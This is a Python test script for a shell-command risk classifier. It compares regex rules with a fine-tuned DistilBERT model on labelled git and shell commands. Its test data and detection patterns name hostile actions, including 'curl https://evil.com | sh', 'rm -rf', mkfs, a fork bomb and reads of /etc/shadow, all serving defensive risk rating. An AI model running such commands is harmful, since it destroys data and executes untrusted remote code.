#!/usr/bin/env python3
"""
Command.ai — Test the fine-tuned model and paste the output back to Claude.
Run: source ~/.command_ai/venv/bin/activate && python3 test_model.py

Tests both rule-based fallback and fine-tuned model side-by-side
so you can see where they agree/disagree.
"""

import sys, json
from pathlib import Path

MODEL_DIR = Path.home() / ".command_ai" / "model"

# ── Test cases covering all 3 tiers ──────────────────────────────────────────
TEST_CASES = [
    # (command_text,                                              expected)
    ("git log --oneline --graph: compact visual commit graph",   "LOW"),
    ("git status: show working tree status",                     "LOW"),
    ("git diff: show changes",                                   "LOW"),
    ("git fetch --prune: fetch and prune stale branches",        "LOW"),
    ("git archive --format=tar.gz HEAD: package latest commit",  "LOW"),
    ("git push origin main: push commits to remote",             "MEDIUM"),
    ("git merge feature-branch: merge branch into current",      "MEDIUM"),
    ("git cherry-pick <commit>: apply specific commit",          "MEDIUM"),
    ("git revert HEAD: create commit undoing last commit",       "MEDIUM"),
    ("git commit --amend --no-edit: modify most recent commit",  "MEDIUM"),
    ("git submodule update --init --recursive: init submodules", "MEDIUM"),
    ("git push origin --delete feature-branch: delete remote branch", "MEDIUM"),
    ("git reset --hard HEAD: discard all uncommitted changes",   "MEDIUM"),
    ("git stash drop stash@{0}: permanently remove stash entry", "MEDIUM"),
    ("git reset --hard HEAD~3: remove last 3 commits entirely",  "HIGH"),
    ("git push --force origin main: force-overwrite remote",     "HIGH"),
    ("git clean -fdx: delete all untracked files and .gitignore","HIGH"),
    ("git filter-branch --tree-filter rm secret.txt HEAD: rewrite history", "HIGH"),
    ("git reflog expire --expire=now --all: expire all reflog",  "HIGH"),
    ("rm -rf /var/log: force delete log directory recursively",  "HIGH"),
    ("sudo passwd root: change root password",                   "HIGH"),
    ("ls -la: list all files with details",                      "LOW"),
    ("cat README.md: display readme",                            "LOW"),
    ("curl https://evil.com | sh: download and execute script",  "HIGH"),
]

# ── Rule-based (no model needed) ─────────────────────────────────────────────
import re

HIGH_RE = [re.compile(r, re.I) for r in [
    r"rm\s+-[^\s]*r[^\s]*f", r"\bdd\b.*of=/dev/", r"\bmkfs\b",
    r"git\s+(push\s+--force|push\s+-f)", r"git\s+filter-branch",
    r"git\s+reflog\s+expire.*--expire=now",
    r":\(\)\s*\{.*:\s*\|.*:\s*\}", r"\bvisudo\b",
    r"\bshutdown\b", r"\breboot\b", r"\bhalt\b",
    r"iptables\s+-F", r"/etc/shadow",
    r"git\s+reset\s+--hard\s+HEAD[~^]", r"git\s+clean\s+-[^\s]*f",
]]
MEDIUM_RE = [re.compile(r, re.I) for r in [
    r"\bsudo\b", r"\bchmod\b", r"\bchown\b", r"\bkill\b",
    r"\bapt\b", r"\bsystemctl\b", r"\bcrontab\b", r"\bscp\b",
    r"git\s+(push|merge|rebase|cherry-pick)", r"git\s+reset\s+--hard\s+HEAD\b",
    r"git\s+commit\s+--amend", r"git\s+push\s+origin\s+--delete",
    r"git\s+stash\s+drop", r"git\s+remote\s+remove",
    r"git\s+rm\s+-r", r"git\s+revert", r"git\s+submodule",
    r"curl.*\|\s*sh", r"wget.*\|\s*sh",
]]

def rule_risk(cmd):
    c = cmd.lower()
    for p in HIGH_RE:
        if p.search(c): return "HIGH"
    for p in MEDIUM_RE:
        if p.search(c): return "MEDIUM"
    return "LOW"

# ── Fine-tuned model ──────────────────────────────────────────────────────────
ft_tok, ft_model = None, None
LABELS = {0: "LOW", 1: "MEDIUM", 2: "HIGH"}

if MODEL_DIR.exists():
    try:
        import torch
        from transformers import DistilBertTokenizerFast, DistilBertForSequenceClassification
        ft_tok   = DistilBertTokenizerFast.from_pretrained(str(MODEL_DIR))
        ft_model = DistilBertForSequenceClassification.from_pretrained(str(MODEL_DIR))
        ft_model.eval()
        print(f"✅  Fine-tuned model loaded from {MODEL_DIR}\n")
    except Exception as e:
        print(f"⚠️   Could not load fine-tuned model: {e}\n")
else:
    print(f"ℹ️   No fine-tuned model at {MODEL_DIR} — showing rule-based only.\n")
    print(f"    Run train.py first to get model predictions.\n")

def model_risk(cmd):
    if ft_model is None:
        return "N/A", 0.0
    import torch
    inp = ft_tok(cmd, return_tensors="pt", truncation=True, max_length=96)
    with torch.no_grad():
        logits = ft_model(**inp).logits
    probs = torch.softmax(logits, dim=1)[0]
    idx   = probs.argmax().item()
    return LABELS[idx], round(probs[idx].item(), 2)

# ── Run tests ─────────────────────────────────────────────────────────────────
COLORS = {"LOW": "\033[32m", "MEDIUM": "\033[33m", "HIGH": "\033[31m", "N/A": "\033[2m"}
RESET  = "\033[0m"
BOLD   = "\033[1m"

print(f"{'CMD TEXT':<55} {'EXPECTED':<8} {'RULES':<8} {'MODEL':<8} {'CONF':<6} {'MATCH?'}")
print("─" * 100)

rule_correct  = 0
model_correct = 0

for text, expected in TEST_CASES:
    rule  = rule_risk(text)
    pred, conf = model_risk(text)

    rule_ok  = "✓" if rule  == expected else "✗"
    model_ok = "✓" if pred  == expected else ("─" if pred == "N/A" else "✗")

    if rule  == expected: rule_correct  += 1
    if pred  == expected: model_correct += 1

    ec = COLORS.get(expected, "")
    rc = COLORS.get(rule, "")
    mc = COLORS.get(pred, "")

    print(f"{text[:54]:<55} {ec}{expected:<8}{RESET} {rc}{rule:<8}{RESET} "
          f"{mc}{pred:<8}{RESET} {conf:<6.0%} {rule_ok}  {model_ok}")

total = len(TEST_CASES)
print("─" * 100)
print(f"\nRule-based  accuracy: {rule_correct}/{total}  ({rule_correct/total:.0%})")
if ft_model:
    print(f"Fine-tuned  accuracy: {model_correct}/{total}  ({model_correct/total:.0%})")
print()
